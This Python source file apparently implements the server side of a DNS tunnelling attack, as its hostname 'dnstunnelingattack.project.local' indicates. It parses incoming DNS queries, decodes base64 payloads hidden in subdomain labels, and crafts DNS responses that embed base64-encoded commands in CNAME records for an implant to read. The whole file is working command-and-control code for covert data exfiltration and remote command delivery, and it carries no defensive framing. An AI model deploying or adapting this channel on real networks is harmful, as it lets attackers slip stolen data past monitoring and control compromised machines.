from base64 import b64decode, b64encode
from os import urandom


class DNSQuery:

    transaction_id: bytes
    flags: bytes
    question_count: bytes
    answer_record_count: bytes
    authority_record_count: bytes
    additional_record_count: bytes
    query_name: str
    query_type: bytes
    query_class: bytes

    # size in bytes
    headers_size = 12
    headers_elements_size = [2, 2, 2, 2, 2, 2]

    query_size = 4
    query_elements_size = [2, 2]

    ttl = b"\x00\x00\x00\x3c"

    def __init__(self, content: bytes) -> None:
        headers = content[: DNSQuery.headers_size]
        parsed_headers = self.parse(headers, DNSQuery.headers_elements_size)
        self.transaction_id = parsed_headers[0]
        self.flags = parsed_headers[1]
        self.question_count = parsed_headers[2]
        self.answer_record_count = parsed_headers[3]
        self.authority_record_count = parsed_headers[4]
        self.additional_record_count = parsed_headers[5]
        assert (
            int(self.question_count.hex(), 16) == 1
        )  # by now, just take into account query with exactly one question
        self.query_name, content = self.readQueryName(content[DNSQuery.headers_size :])
        parsed_query = self.parse(
            content[: DNSQuery.query_size], DNSQuery.query_elements_size
        )
        self.query_type = parsed_query[0]
        self.query_class = parsed_query[1]
        # don't take into account additionnal information

    def parse(self, tab: bytes, elementssize: list[int]) -> list[bytes]:
        i = 0
        res = []
        for x in elementssize:
            res.append(tab[i : i + x])
            i += x
        return res

    def readQueryName(self, content: bytes) -> tuple[str, bytes]:
        next_length = int(hex(content[0]), 16)
        res = ""
        while next_length != 0:
            res += content[1 : next_length + 1].decode()
            res += "."
            content = content[next_length + 1 :]
            next_length = int(hex(content[0]), 16)
        return res[: len(res) - 1], content[1:]

    def extractPayload(self) -> str:
        splitted_query_name = self.query_name.split(".")
        encoded_payload = "".join(splitted_query_name[: len(splitted_query_name) - 3])
        return b64decode(encoded_payload).decode()

    def isHelloQuery(self) -> bool:
        return (
            self.query_name == "dnstunnelingattack.project.local"
            and int(self.query_type.hex(), 16) == 1
            and int(self.question_count.hex(), 16) == 1
        )

    def generateResponse(self, command: bytes) -> bytes:
        response = self.transaction_id
        response += b"\x81\x80"
        response += self.question_count
        response += b"\x00\x02"
        response += self.authority_record_count
        response += b"\x00\x00"
        for part in self.query_name.split("."):
            l = hex(len(part))[2:]
            if len(l) == 1:
                l = "0" + l
            response += bytes.fromhex(l)
            response += part.encode()
        response += b"\x00"
        response += self.query_type
        response += self.query_class
        response += b"\xc0\x0c"
        response += b"\x00\x05"
        response += b"\x00\x01"
        response += DNSQuery.ttl
        command = b64encode(command.decode().strip("\n").encode())
        to_send = b""
        for i in range(0, len(command), 62):
            block = command[i : i + 62]
            l = hex(len(block))[2:]
            if len(l) == 1:
                l = "0" + l
            to_send += bytes.fromhex(l)
            to_send += block
        to_send += b"\x12dnstunnelingattack\x07project\x05local\x00"
        l = bytes.fromhex(hex(len(to_send))[2:])
        if len(l) < 2:
            response += b"\x00"
        response += l
        response += to_send
        response += to_send
        response += self.query_type
        response += self.query_class
        response += DNSQuery.ttl
        response += b"\x00\x04"
        response += urandom(4)
        return response
